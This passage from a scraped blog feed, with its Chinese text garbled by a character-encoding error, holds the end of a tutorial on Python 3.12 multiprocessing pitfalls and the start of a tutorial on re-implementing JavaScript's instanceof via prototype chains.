<p>å³ä½¿æœ‰äº†Python 3.12çš„ä¼˜åŒ–ï¼Œæœ‰äº›å‘è¿˜æ˜¯å¾—æ³¨æ„ï¼š</p>
<h3 data-id="heading-16">1. è¿›ç¨‹æ•°ä¸æ˜¯è¶Šå¤šè¶Šå¥½</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> multiprocessing
<span class="hljs-keyword">import</span> time

<span class="hljs-keyword">def</span> <span class="hljs-title function_">test_process_count</span>():
    <span class="hljs-string">"""æµ‹è¯•æœ€ä¼˜è¿›ç¨‹æ•°"""</span>

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">task</span>():
        time.sleep(<span class="hljs-number">1</span>)
        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>

    <span class="hljs-comment"># CPUæ ¸å¿ƒæ•°</span>
    cpu_count = multiprocessing.cpu_count()
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"CPUæ ¸å¿ƒæ•°: <span class="hljs-subst">{cpu_count}</span>"</span>)

    <span class="hljs-keyword">for</span> worker_count <span class="hljs-keyword">in</span> [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, cpu_count, cpu_count * <span class="hljs-number">2</span>, cpu_count * <span class="hljs-number">4</span>]:
        start = time.time()
        <span class="hljs-keyword">with</span> multiprocessing.Pool(processes=worker_count) <span class="hljs-keyword">as</span> pool:
            results = pool.<span class="hljs-built_in">map</span>(task, <span class="hljs-built_in">range</span>(cpu_count * <span class="hljs-number">2</span>))
        end = time.time()
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{worker_count}</span>ä¸ªè¿›ç¨‹è€—æ—¶: <span class="hljs-subst">{end - start:<span class="hljs-number">.2</span>f}</span>ç§’"</span>)

<span class="hljs-comment"># é€šå¸¸è¿›ç¨‹æ•° = CPUæ ¸å¿ƒæ•° æˆ– CPUæ ¸å¿ƒæ•° + 1</span>
</code></pre>
<h3 data-id="heading-17">2. å…¨å±€å˜é‡çš„é™·é˜±</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># âŒ é”™è¯¯ç¤ºä¾‹</span>
global_data = []

<span class="hljs-keyword">def</span> <span class="hljs-title function_">worker</span>():
    global_data.append(<span class="hljs-number">1</span>)  <span class="hljs-comment"># åœ¨å¤šè¿›ç¨‹ä¸­å¯èƒ½ä¸ä¼šç”Ÿæ•ˆï¼</span>

<span class="hljs-comment"># âœ… æ­£ç¡®æ–¹å¼</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">worker</span>(<span class="hljs-params">queue</span>):
    queue.put(<span class="hljs-number">1</span>)  <span class="hljs-comment"># ä½¿ç”¨é˜Ÿåˆ—ä¼ é€’æ•°æ®</span>
</code></pre>
<h3 data-id="heading-18">3. æ­»é”çš„é£é™©</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> multiprocessing
<span class="hljs-keyword">import</span> threading
<span class="hljs-keyword">import</span> time

<span class="hljs-comment"># âŒ å±é™©ä»£ç ï¼šå¯èƒ½åœ¨Python 3.12ä¸­ä¹Ÿä¼šæ­»é”</span>
lock = multiprocessing.Lock()

<span class="hljs-keyword">def</span> <span class="hljs-title function_">worker</span>():
    <span class="hljs-keyword">with</span> lock:
        time.sleep(<span class="hljs-number">1</span>)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"å·¥ä½œå®Œæˆ"</span>)

<span class="hljs-comment"># âœ… ä½¿ç”¨è¶…æ—¶æœºåˆ¶</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">safe_worker</span>():
    <span class="hljs-keyword">try</span>:
        <span class="hljs-keyword">if</span> lock.acquire(timeout=<span class="hljs-number">5</span>):  <span class="hljs-comment"># Python 3.12ä¸­æ›´å¯é çš„è¶…æ—¶</span>
            <span class="hljs-keyword">try</span>:
                time.sleep(<span class="hljs-number">1</span>)
                <span class="hljs-built_in">print</span>(<span class="hljs-string">"å®‰å…¨å·¥ä½œå®Œæˆ"</span>)
            <span class="hljs-keyword">finally</span>:
                lock.release()
        <span class="hljs-keyword">else</span>:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">"è·å–é”è¶…æ—¶"</span>)
    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"å‡ºé”™: <span class="hljs-subst">{e}</span>"</span>)
</code></pre>
<h2 data-id="heading-19">æ€»ç»“ï¼šå¦‚ä½•é€‰æ‹©æ­£ç¡®çš„å¹¶å‘ç­–ç•¥</h2>
<p>çœ‹äº†è¿™ä¹ˆå¤šï¼Œåˆ°åº•è¯¥æ€ä¹ˆé€‰ï¼Ÿè¿™é‡Œç»™ä½ ä¸€å¼ å†³ç­–è¡¨ï¼š</p>
<pre><code class="hljs language-css" lang="css">åœºæ™¯é€‰æ‹©æµç¨‹ï¼š
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚   ä½ çš„ä»»åŠ¡æ˜¯ä»€ä¹ˆï¼Ÿ   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”˜
         â†“
    â”Œâ”€â”€â”€â”€â”€â”€â”       â”Œâ”€â”€â”€â”€â”€â”€â”       â”Œâ”€â”€â”€â”€â”€â”€â”
    â”‚<span class="hljs-selector-tag">I</span>/Oå¯†é›†â”‚       â”‚CPUå¯†é›†â”‚       â”‚æ··åˆå‹ â”‚
    â””â”€â”€â”€â”¬â”€â”€â”˜       â””â”€â”€â”€â”¬â”€â”€â”˜       â””â”€â”€â”€â”¬â”€â”€â”˜
        â†“               â†“               â†“
  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”     â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”     â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
  â”‚ç½‘ç»œè¯·æ±‚å¤šï¼Ÿâ”‚     â”‚è®¡ç®—é‡å¤§ï¼Ÿ â”‚     â”‚ç½‘ç»œ+è®¡ç®—éƒ½æœ‰ï¼Ÿ â”‚
  â””â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”˜     â””â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”˜     â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜
       â†“                â†“                â†“
  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”     â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”     â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
  â”‚å¼‚æ­¥åç¨‹ â”‚     â”‚å¤šè¿›ç¨‹   â”‚     â”‚å¼‚æ­¥+å¤šè¿›ç¨‹   â”‚
  â”‚(asyncio)â”‚     â”‚         â”‚     â”‚   æ··åˆä½¿ç”¨   â”‚
  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜     â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜     â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<p><strong>å®ç”¨å»ºè®®ï¼š</strong></p>
<ol>
<li><strong>ä¼˜å…ˆè€ƒè™‘å¼‚æ­¥</strong>ï¼šPython 3.12çš„asyncioå·²ç»å¾ˆæˆç†Ÿï¼Œå¤§éƒ¨åˆ†I/Oåœºæ™¯éƒ½é€‚ç”¨</li>
<li><strong>CPUä»»åŠ¡ç”¨å¤šè¿›ç¨‹</strong>ï¼šåˆ«çŠ¹è±«ï¼Œè¿™æ˜¯æœ€ç›´æ¥çš„è§£å†³æ–¹æ¡ˆ</li>
<li><strong>åˆç†è®¾ç½®è¿›ç¨‹æ•°</strong>ï¼šé€šå¸¸æ˜¯CPUæ ¸å¿ƒæ•°æˆ–æ ¸å¿ƒæ•°+1</li>
<li><strong>æ³¨æ„è¿›ç¨‹é—´é€šä¿¡å¼€é”€</strong>ï¼šæ•°æ®é‡å¤§ä¼šå½±å“æ€§èƒ½</li>
<li><strong>åŠæ—¶å‡çº§åˆ°Python 3.12</strong>ï¼šæ€§èƒ½æå‡æ˜æ˜¾ï¼Œç‰¹åˆ«æ˜¯å¯¹ç°æœ‰ä»£ç </li>
</ol>
<h2 data-id="heading-20">å†™åœ¨æœ€å</h2>
<p>å›åˆ°å¼€å¤´çš„é—®é¢˜ï¼šä¸ºä»€ä¹ˆå¤§å‚éƒ½åœ¨å‡çº§Python 3.12ï¼Ÿ</p>
<p>ç­”æ¡ˆä¸ä»…ä»…æ˜¯"å®ƒæ›´å¿«"ï¼Œè€Œæ˜¯ï¼š</p>
<ol>
<li><strong>å¹¶å‘æ€§èƒ½æ˜¾è‘—æå‡</strong>ï¼šGILä¼˜åŒ–ã€TLSæ”¹è¿›ã€è°ƒåº¦ç®—æ³•å‡çº§</li>
<li><strong>æ›´å¥½çš„é”™è¯¯å¤„ç†</strong>ï¼šè¿›ç¨‹æ± å’Œçº¿ç¨‹æ± æ›´ç¨³å®šå¯é </li>
<li><strong>å‘åå…¼å®¹</strong>ï¼šå‡çº§æˆæœ¬ä½ï¼Œæ”¶ç›Šé«˜</li>
<li><strong>æœªæ¥è¶‹åŠ¿</strong>ï¼šPythonç”Ÿæ€åœˆæ­£åœ¨å‘3.12+è¿ç§»</li>
</ol>
<p><strong>è®°ä½ä¸€å¥è¯ï¼šPythonå¹¶å‘ç¼–ç¨‹ä¸æ˜¯é€‰æ‹©å¤šçº¿ç¨‹è¿˜æ˜¯å¤šè¿›ç¨‹ï¼Œè€Œæ˜¯ç†è§£ä½ çš„ä»»åŠ¡æœ¬è´¨ï¼Œé€‰æ‹©æœ€åˆé€‚çš„å·¥å…·ã€‚</strong></p>
<p>ä¸‹æ¬¡å†é‡åˆ°æ€§èƒ½ç“¶é¢ˆï¼Œä¸è¦åªæƒ³ç€"åŠ çº¿ç¨‹"æˆ–"åŠ è¿›ç¨‹"ï¼Œå…ˆé—®é—®è‡ªå·±ï¼š</p>
<ul>
<li>æˆ‘çš„ä»»åŠ¡ç“¶é¢ˆåœ¨å“ªé‡Œï¼Ÿæ˜¯I/Oè¿˜æ˜¯CPUï¼Ÿ</li>
<li>æˆ‘çš„æ•°æ®é‡æœ‰å¤šå¤§ï¼Ÿè¿›ç¨‹é—´é€šä¿¡å¼€é”€å¦‚ä½•ï¼Ÿ</li>
<li>æˆ‘çš„é¡¹ç›®é€‚åˆå‡çº§åˆ°Python 3.12å—ï¼Ÿ</li>
</ul>
<p>æƒ³æ¸…æ¥šè¿™äº›ï¼Œä½ å°±èƒ½å†™å‡ºçœŸæ­£é«˜æ•ˆçš„å¹¶å‘ä»£ç ã€‚</p>
<hr/>
<p><strong>äº’åŠ¨æ—¶é—´</strong>ï¼šä½ åœ¨é¡¹ç›®é‡Œè¸©è¿‡å“ªäº›å¹¶å‘ç¼–ç¨‹çš„å‘ï¼Ÿè¯„è®ºåŒºèŠèŠï¼Œçœ‹çœ‹è°è¸©çš„å‘æœ€æ·±ï¼ ( ` Ï‰Â´ )</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ‰‹å†™ instanceofï¼šæ·±å…¥ç†è§£ JavaScript åŸå‹ä¸ç»§æ‰¿æœºåˆ¶]]></title>    <link>https://juejin.cn/post/7581036773607571456</link>    <guid>https://juejin.cn/post/7581036773607571456</guid>    <pubDate>2025-12-08T05:46:20.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581036773607571456" data-draft-id="7581036773607555072" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ‰‹å†™ instanceofï¼šæ·±å…¥ç†è§£ JavaScript åŸå‹ä¸ç»§æ‰¿æœºåˆ¶"/> <meta itemprop="keywords" content="JavaScript,HTML,å‰ç«¯"/> <meta itemprop="datePublished" content="2025-12-08T05:46:20.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="wwwwW"/> <meta itemprop="url" content="https://juejin.cn/user/631558156323657"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ‰‹å†™ instanceofï¼šæ·±å…¥ç†è§£ JavaScript åŸå‹ä¸ç»§æ‰¿æœºåˆ¶
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/631558156323657/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    wwwwW
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T05:46:20.000Z" title="Mon Dec 08 2025 05:46:20 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">æ‰‹å†™ instanceofï¼šæ·±å…¥ç†è§£ JavaScript åŸå‹ä¸ç»§æ‰¿æœºåˆ¶</h2>
<p>åœ¨ JavaScript çš„é¢å‘å¯¹è±¡ç¼–ç¨‹ï¼ˆOOPï¼‰ä½“ç³»ä¸­ï¼Œ<code>instanceof</code> æ˜¯ä¸€ä¸ªéå¸¸å…³é”®çš„è¿ç®—ç¬¦ã€‚å®ƒç”¨äºåˆ¤æ–­æŸä¸ªå¯¹è±¡æ˜¯å¦æ˜¯ç‰¹å®šæ„é€ å‡½æ•°çš„å®ä¾‹ï¼Œå…¶æœ¬è´¨æ˜¯æ£€æŸ¥è¯¥å¯¹è±¡çš„åŸå‹é“¾ä¸Šæ˜¯å¦å­˜åœ¨æŒ‡å®šæ„é€ å‡½æ•°çš„ <code>prototype</code> å¯¹è±¡ã€‚ç„¶è€Œï¼Œåœ¨å¤§å‹é¡¹ç›®ã€å¤šäººåä½œå¼€å‘åœºæ™¯ä¸‹ï¼Œå¼€å‘è€…å¸¸å¸¸å¯¹å¯¹è±¡çš„æ¥æºå’Œç»§æ‰¿å…³ç³»æ„Ÿåˆ°å›°æƒ‘ã€‚æ­¤æ—¶ï¼Œç†è§£å¹¶æŒæ¡ <code>instanceof</code> çš„åº•å±‚åŸç†ï¼Œç”šè‡³æ‰‹å†™å…¶å®ç°é€»è¾‘ï¼Œå°±æ˜¾å¾—å°¤ä¸ºé‡è¦ã€‚</p>
<p>æœ¬æ–‡å°†å›´ç»•â€œæ‰‹å†™ instanceofâ€è¿™ä¸€ä¸»é¢˜ï¼Œä»åŸå‹ä¸åŸå‹é“¾çš„åŸºæœ¬æ¦‚å¿µå‡ºå‘ï¼Œé€æ­¥å‰–æ JavaScript ä¸­çš„ç»§æ‰¿æ–¹å¼ï¼Œå¹¶æœ€ç»ˆå®ç°ä¸€ä¸ªç¬¦åˆè§„èŒƒçš„ <code>isInstanceOf</code> å‡½æ•°ã€‚</p>
<hr/>
<h3 data-id="heading-1">ä¸€ã€åŸå‹ä¸åŸå‹é“¾ï¼šJavaScript OOP çš„åŸºçŸ³</h3>
<p>JavaScript å¹¶ä¸åƒ Java æˆ– C++ é‚£æ ·æ‹¥æœ‰â€œç±»â€çš„è¯­æ³•ï¼ˆES6 ä¹‹å‰çš„ç‰ˆæœ¬ï¼‰ï¼Œè€Œæ˜¯åŸºäº<strong>åŸå‹ï¼ˆPrototypeï¼‰</strong> å®ç°é¢å‘å¯¹è±¡ç¼–ç¨‹ã€‚æ¯ä¸ªå‡½æ•°éƒ½æœ‰ä¸€ä¸ª <code>prototype</code> å±æ€§ï¼ŒæŒ‡å‘ä¸€ä¸ªå¯¹è±¡ï¼›è€Œæ¯ä¸ªå¯¹è±¡ï¼ˆé™¤ <code>null</code> å¤–ï¼‰éƒ½æœ‰ä¸€ä¸ªå†…éƒ¨å±æ€§ <code>[[Prototype]]</code>ï¼Œé€šå¸¸é€šè¿‡ <code>__proto__</code> è®¿é—®ã€‚</p>
<p>å½“ä½¿ç”¨ <code>new</code> å…³é”®å­—åˆ›å»ºå¯¹è±¡æ—¶ï¼Œæ–°å¯¹è±¡çš„ <code>[[Prototype]]</code> ä¼šè¢«è®¾ç½®ä¸ºæ„é€ å‡½æ•°çš„ <code>prototype</code>ã€‚ä¾‹å¦‚ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Animal</span>(<span class="hljs-params"/>) {}
<span class="hljs-keyword">const</span> dog = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Animal</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(dog.<span class="hljs-property">__proto__</span> === <span class="hljs-title class_">Animal</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>); <span class="hljs-comment">// true</span>
</code></pre>
<p>è¿™ç§é“¾æ¥å…³ç³»å½¢æˆäº†æ‰€è°“çš„<strong>åŸå‹é“¾</strong>ã€‚å½“è®¿é—®ä¸€ä¸ªå¯¹è±¡çš„å±æ€§æˆ–æ–¹æ³•æ—¶ï¼Œå¦‚æœè‡ªèº«æ²¡æœ‰ï¼ŒJavaScript å¼•æ“ä¼šæ²¿ç€åŸå‹é“¾å‘ä¸ŠæŸ¥æ‰¾ï¼Œç›´åˆ°æ‰¾åˆ°è¯¥å±æ€§æˆ–åˆ°è¾¾é“¾çš„é¡¶ç«¯ï¼ˆå³ <code>Object.prototype</code>ï¼Œå…¶ <code>__proto__</code> ä¸º <code>null</code>ï¼‰ã€‚</p>
<hr/>
<h3 data-id="heading-2">äºŒã€instanceof çš„ä½œç”¨ä¸å±€é™</h3>
<p><code>instanceof</code> è¿ç®—ç¬¦çš„è¯­æ³•ä¸ºï¼š</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-tag">A</span> instanceof <span class="hljs-selector-tag">B</span>
</code></pre>
<p>å…¶å«ä¹‰æ˜¯ï¼š<strong>A çš„åŸå‹é“¾ä¸Šæ˜¯å¦åŒ…å« B.prototype</strong>ã€‚è¿™åœ¨åˆ¤æ–­å¯¹è±¡â€œè¡€ç¼˜å…³ç³»â€æ—¶éå¸¸æœ‰ç”¨ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> arr = [];
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Array</span>);  <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Object</span>); <span class="hljs-comment">// true</span>
</code></pre>
<p>ä½† <code>instanceof</code> ä¹Ÿæœ‰å±€é™æ€§ï¼š</p>
<ul>
<li>åœ¨è·¨ iframe æˆ–ä¸åŒå…¨å±€ç¯å¢ƒï¼ˆå¦‚ Web Workerï¼‰ä¸­ï¼Œç”±äºæ„é€ å‡½æ•°å¼•ç”¨ä¸åŒï¼Œå¯èƒ½å¯¼è‡´è¯¯åˆ¤ã€‚</li>
<li>å®ƒä¾èµ–äºåŸå‹é“¾ï¼Œè‹¥åŸå‹è¢«ç¯¡æ”¹ï¼Œç»“æœå¯èƒ½ä¸å¯é ã€‚</li>
</ul>
<p>å› æ­¤ï¼Œç†è§£å…¶å†…éƒ¨æœºåˆ¶ï¼Œæœ‰åŠ©äºæˆ‘ä»¬åœ¨å¿…è¦æ—¶è‡ªå®šä¹‰æ›´å¯é çš„ç±»å‹åˆ¤æ–­é€»è¾‘ã€‚</p>
<hr/>
<h3 data-id="heading-3">ä¸‰ã€æ‰‹å†™ instanceofï¼šæ¨¡æ‹ŸåŸå‹é“¾æŸ¥æ‰¾</h3>
<p>æ ¹æ® <code>instanceof</code> çš„å®šä¹‰ï¼Œæˆ‘ä»¬å¯ä»¥æ‰‹åŠ¨å®ç°ä¸€ä¸ª <code>isInstanceOf</code> å‡½æ•°ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">function isInstanceOf(left, right) {
    let <span class="hljs-attr">proto</span> = left.__proto__<span class="hljs-comment">;</span>
    while (proto) {
        if (<span class="hljs-attr">proto</span> === right.prototype) {
            return true<span class="hljs-comment">;</span>
        }
        <span class="hljs-attr">proto</span> = proto.__proto__<span class="hljs-comment">;</span>
    }
    return false<span class="hljs-comment">;</span>
}
</code></pre>
<p>è¯¥å‡½æ•°ä» <code>left</code> å¯¹è±¡çš„ <code>__proto__</code> å¼€å§‹ï¼Œé€çº§å‘ä¸Šéå†åŸå‹é“¾ï¼Œè‹¥åœ¨æŸä¸€å±‚å‘ç°ä¸ <code>right.prototype</code> å¼•ç”¨ç›¸ç­‰ï¼Œåˆ™è¿”å› <code>true</code>ï¼›è‹¥éå†åˆ° <code>null</code> ä»æœªæ‰¾åˆ°ï¼Œåˆ™è¿”å› <code>false</code>ã€‚</p>
<h4 data-id="heading-4">ç¤ºä¾‹éªŒè¯ï¼š</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Animal</span>(<span class="hljs-params"/>) {}
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Dog</span>(<span class="hljs-params"/>) {}
<span class="hljs-title class_">Dog</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Animal</span>();

<span class="hljs-keyword">const</span> dog = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>();

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">isInstanceOf</span>(dog, <span class="hljs-title class_">Dog</span>));     <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">isInstanceOf</span>(dog, <span class="hljs-title class_">Animal</span>));  <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">isInstanceOf</span>(dog, <span class="hljs-title class_">Object</span>));  <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">isInstanceOf</span>(dog, <span class="hljs-title class_">Array</span>));   <span class="hljs-comment">// false</span>
</code></pre>
<p>ç»“æœä¸åŸç”Ÿ <code>instanceof</code> å®Œå…¨ä¸€è‡´ï¼Œè¯´æ˜æˆ‘ä»¬çš„å®ç°æ˜¯æ­£ç¡®çš„ã€‚</p>
<blockquote>
<p>æ³¨æ„ï¼šç°ä»£ JavaScript æ¨èä½¿ç”¨ <code>Object.getPrototypeOf(obj)</code> æ›¿ä»£ <code>obj.__proto__</code>ï¼Œä»¥æé«˜ä»£ç çš„è§„èŒƒæ€§å’Œå…¼å®¹æ€§ã€‚å› æ­¤æ›´å¥å£®çš„å†™æ³•æ˜¯ï¼š</p>
</blockquote>
<pre><code class="hljs language-ini" lang="ini">function isInstanceOf(left, right) {
    let <span class="hljs-attr">proto</span> = Object.getPrototypeOf(left)<span class="hljs-comment">;</span>
    while (proto) {
        if (<span class="hljs-attr">proto</span> === right.prototype) return <span class="hljs-literal">true</span><span class="hljs-comment">;</span>
        <span class="hljs-attr">proto</span> = Object.getPrototypeOf(proto)<span class="hljs-comment">;</span>
    }
    return false<span class="hljs-comment">;</span>
}
</code></pre>
<hr/>
<h3 data-id="heading-5">å››ã€JavaScript ä¸­çš„ç»§æ‰¿æ–¹å¼</h3>
